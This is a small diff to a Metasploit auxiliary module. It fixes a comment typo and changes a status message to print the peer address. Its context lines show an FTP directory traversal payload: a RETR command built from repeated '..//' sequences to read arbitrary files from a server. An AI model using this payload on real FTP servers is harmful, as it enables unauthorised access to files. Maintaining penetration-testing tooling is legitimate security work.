@@ -62,11 +62,11 @@ class Metasploit3 < Msf::Auxiliary
       retr_cmd = ( "..//" * 32 ) + "#{file_path}"
       res = send_cmd( ["RETR", retr_cmd])
 
-      # read the file data from the socker that we opened
+      # read the file data from the socket that we opened
       response_data = sock.read(1024)
 
       if response_data.length == 0 or ! (res =~ /^150/ )
-        print_status("File (#{file_path})from #{rhost} : #{rport} is empty...")
+        print_status("File (#{file_path})from #{peer} is empty...")
         return
       end
 
